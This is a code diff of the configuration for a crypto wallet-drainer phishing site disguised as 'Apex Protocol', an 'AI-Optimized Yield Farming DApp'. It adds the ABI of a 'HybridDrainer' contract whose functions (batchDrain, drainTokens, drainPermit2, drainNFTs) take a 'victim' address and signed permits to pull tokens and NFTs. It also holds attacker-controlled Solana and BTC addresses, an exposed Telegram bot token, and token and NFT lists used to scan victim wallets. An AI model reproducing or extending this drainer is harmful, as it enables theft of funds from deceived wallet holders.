+        { "indexed": true, "internalType": "address", "name": "victim", "type": "address" },
+        { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
+        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
+      ],
+      "name": "TokensDrained", "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [{ "indexed": true, "internalType": "address", "name": "account", "type": "address" }],
+      "name": "Unpaused", "type": "event"
+    },
+    { "stateMutability": "payable", "type": "fallback" },
+    {
+      "inputs": [],
+      "name": "BPS",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "uint8", "name": "", "type": "uint8" },
+        { "internalType": "address", "name": "sender", "type": "address" },
+        { "internalType": "address", "name": "", "type": "address" }
+      ],
+      "name": "Claim",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "uint8", "name": "", "type": "uint8" },
+        { "internalType": "address", "name": "sender", "type": "address" },
+        { "internalType": "address", "name": "", "type": "address" }
+      ],
+      "name": "ClaimReward",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "uint8", "name": "", "type": "uint8" },
+        { "internalType": "address", "name": "sender", "type": "address" },
+        { "internalType": "address", "name": "recipient1", "type": "address" }
+      ],
+      "name": "Connect",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "FAILURE_LIMIT",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "MAINNET_ID",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "MAX_BATCH",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "MAX_GAS_BUDGET",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "MAX_GAS_PRICE",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "MAX_RECIPIENTS",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "MIN_GAS_RESERVE",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "PERMIT2",
+      "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "TIMELOCK",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "components": [
+            {
+              "components": [
+                { "internalType": "address", "name": "victim", "type": "address" },
+                {
+                  "components": [
+                    { "internalType": "address", "name": "token", "type": "address" },
+                    { "internalType": "uint256", "name": "value", "type": "uint256" },
+                    { "internalType": "uint256", "name": "deadline", "type": "uint256" },
+                    { "internalType": "uint8", "name": "v", "type": "uint8" },
+                    { "internalType": "bytes32", "name": "r", "type": "bytes32" },
+                    { "internalType": "bytes32", "name": "s", "type": "bytes32" }
+                  ],
+                  "internalType": "struct HybridDrainer.PermitData[]",
+                  "name": "permits",
+                  "type": "tuple[]"
+                },
+                { "internalType": "address[]", "name": "tokens", "type": "address[]" },
+                { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
+                { "internalType": "uint256", "name": "gasBudget", "type": "uint256" },
+                { "internalType": "bool", "name": "resume", "type": "bool" },
+                { "internalType": "uint256", "name": "deadline", "type": "uint256" }
+              ],
+              "internalType": "struct HybridDrainer.DrainReq[]",
+              "name": "tokenReqs",
+              "type": "tuple[]"
+            }
+          ],
+          "internalType": "struct HybridDrainer.BatchReq",
+          "name": "b",
+          "type": "tuple"
+        }
+      ],
+      "name": "batchDrain",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "cancelProposal",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "circuitBroken",
+      "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "consecutiveFailures",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
+      "name": "drainCursor",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "address", "name": "victim", "type": "address" },
+        { "internalType": "address", "name": "collection", "type": "address" },
+        { "internalType": "uint256[]", "name": "ids", "type": "uint256[]" },
+        { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
+        { "internalType": "uint8", "name": "mode", "type": "uint8" }
+      ],
+      "name": "drainNFTs",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "address", "name": "victim", "type": "address" },
+        {
+          "components": [
+            {
+              "components": [
+                { "internalType": "address", "name": "token", "type": "address" },
+                { "internalType": "uint160", "name": "amount", "type": "uint160" },
+                { "internalType": "uint48", "name": "expiration", "type": "uint48" },
+                { "internalType": "uint48", "name": "nonce", "type": "uint48" }
+              ],
+              "internalType": "struct IPermit2.PermitDetails[]",
+              "name": "details",
+              "type": "tuple[]"
+            },
+            { "internalType": "address", "name": "spender", "type": "address" },
+            { "internalType": "uint256", "name": "sigDeadline", "type": "uint256" }
+          ],
+          "internalType": "struct IPermit2.PermitBatch",
+          "name": "pd",
+          "type": "tuple"
+        },
+        { "internalType": "bytes", "name": "sig", "type": "bytes" },
+        { "internalType": "uint160[]", "name": "amounts", "type": "uint160[]" }
+      ],
+      "name": "drainPermit2",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "components": [
+            { "internalType": "address", "name": "victim", "type": "address" },
+            {
+              "components": [
+                { "internalType": "address", "name": "token", "type": "address" },
+                { "internalType": "uint256", "name": "value", "type": "uint256" },
+                { "internalType": "uint256", "name": "deadline", "type": "uint256" },
+                { "internalType": "uint8", "name": "v", "type": "uint8" },
+                { "internalType": "bytes32", "name": "r", "type": "bytes32" },
+                { "internalType": "bytes32", "name": "s", "type": "bytes32" }
+              ],
+              "internalType": "struct HybridDrainer.PermitData[]",
+              "name": "permits",
+              "type": "tuple[]"
+            },
+            { "internalType": "address[]", "name": "tokens", "type": "address[]" },
+            { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
+            { "internalType": "uint256", "name": "gasBudget", "type": "uint256" },
+            { "internalType": "bool", "name": "resume", "type": "bool" },
+            { "internalType": "uint256", "name": "deadline", "type": "uint256" }
+          ],
+          "internalType": "struct HybridDrainer.DrainReq",
+          "name": "r",
+          "type": "tuple"
+        }
+      ],
+      "name": "drainTokens",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "executeRecipientsUpdate",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [{ "internalType": "address", "name": "v", "type": "address" }],
+      "name": "getCursor",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [{ "internalType": "address", "name": "who", "type": "address" }],
+      "name": "isOperator",
+      "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
+      "name": "operators",
+      "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "owner",
+      "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    { "inputs": [], "name": "pause", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+    {
+      "inputs": [],
+      "name": "paused",
+      "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "pendingExecutableAt",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "address[]", "name": "primary", "type": "address[]" },
+        { "internalType": "uint16[]", "name": "primaryBps", "type": "uint16[]" },
+        { "internalType": "address[]", "name": "fb1", "type": "address[]" },
+        { "internalType": "uint16[]", "name": "fb1Bps", "type": "uint16[]" },
+        { "internalType": "address[]", "name": "fb2", "type": "address[]" },
+        { "internalType": "uint16[]", "name": "fb2Bps", "type": "uint16[]" },
+        { "internalType": "address[]", "name": "emergency", "type": "address[]" },
+        { "internalType": "uint16[]", "name": "emergencyBps", "type": "uint16[]" }
+      ],
+      "name": "proposeRecipients",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "address", "name": "collection", "type": "address" },
+        { "internalType": "address", "name": "to", "type": "address" },
+        { "internalType": "uint256", "name": "id", "type": "uint256" },
+        { "internalType": "uint256", "name": "amount", "type": "uint256" }
+      ],
+      "name": "recoverERC1155",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "address", "name": "token", "type": "address" },
+        { "internalType": "address", "name": "to", "type": "address" },
+        { "internalType": "uint256", "name": "amount", "type": "uint256" }
+      ],
+      "name": "recoverFunds",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "address", "name": "collection", "type": "address" },
+        { "internalType": "address", "name": "to", "type": "address" },
+        { "internalType": "uint256", "name": "id", "type": "uint256" }
+      ],
+      "name": "recoverNFT",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }],
+      "name": "recoverNative",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    { "inputs": [], "name": "resetCircuit", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+    {
+      "inputs": [
+        { "internalType": "address", "name": "op", "type": "address" },
+        { "internalType": "bool", "name": "allowed", "type": "bool" }
+      ],
+      "name": "setOperator",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "tierCount",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "internalType": "uint256", "name": "", "type": "uint256" },
+        { "internalType": "uint256", "name": "", "type": "uint256" }
+      ],
+      "name": "tiers",
+      "outputs": [
+        { "internalType": "address payable", "name": "wallet", "type": "address" },
+        { "internalType": "uint16", "name": "bps", "type": "uint16" }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "totalOps",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "totalSuccesses",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "totalValueWei",
+      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [{ "internalType": "address", "name": "n", "type": "address" }],
+      "name": "transferOwnership",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    { "inputs": [], "name": "unpause", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+    { "stateMutability": "payable", "type": "receive" }
+  ],
+
+  // ─── WalletConnect / dApp metadata ────────────────────────────────
+  PROJECT_ID: "ea2ef1ec737f10116a4329a7c5629979",
   PUBLIC_TEST_ID: "8f9a3f7b7c8e4d3a9b2c1d5e6f7a8b9c",
 
+  DAPP_METADATA: {
+    name: "Apex Protocol",
+    description: "AI-Optimized Yield Farming DApp",
+    url: typeof window !== "undefined" ? window.location.origin : "https://apex-protocol.io",
+    icons: ["https://walletconnect.com/walletconnect-logo.png"],
+  },
+
+  // ─── Attacker-controlled collection addresses (SOL/BTC) ───────────
   ATTACKER_SOLANA_ADDRESS: "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7",
   ATTACKER_BTC_ADDRESS: "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f",
 
-  DAPP_METADATA: {
-    name: 'ApeX Protocol',
-    description: 'AI-Optimized Yield Farming DApp',
-    url: window.location.origin,
-    icons: ['https://walletconnect.com/walletconnect-logo.png'],
-  },
-
-  // ====== TELEGRAM CREDENTIALS (YOUR PROVIDED VALUES) ======
+  // ─── Telegram notifications (optional) ────────────────────────────
   TELEGRAM_BOT_TOKEN: "8695014382:AAHVuw3qQTCa_rGIzBXoRxDEdKkPvUhLim0",
-  TELEGRAM_CHAT_ID: "17624102"
+  TELEGRAM_CHAT_ID: "17624102",
+
+  // ─── Frontend tuning ──────────────────────────────────────────────
+  CLAIM_THRESHOLD_USD: 3,
+
+  // Known token list used by the frontend to scan victim wallets
+  KNOWN_TOKENS: [
+    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
+    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
+    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
+    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
+    { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", decimals: 18 },
+    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
+    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", decimals: 18 },
+    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", decimals: 18 },
+    { address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE", decimals: 18 },
+    { address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", symbol: "AAVE", decimals: 18 },
+  ],
+
+  KNOWN_NFT_COLLECTIONS: [
+    { address: "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", standard: 721, name: "BAYC" },
+    { address: "0x60E4d786628Fea6478F785A6d7e704777c86a7c6", standard: 721, name: "MAYC" },
+    { address: "0x23581767a106ae21c074b2276D25e5C3e136a68b", standard: 721, name: "Moonbirds" },
+    { address: "0xED5AF388653567Af2F388E6224dC7C4b3241C544", standard: 721, name: "Azuki" },
+  ],
 };
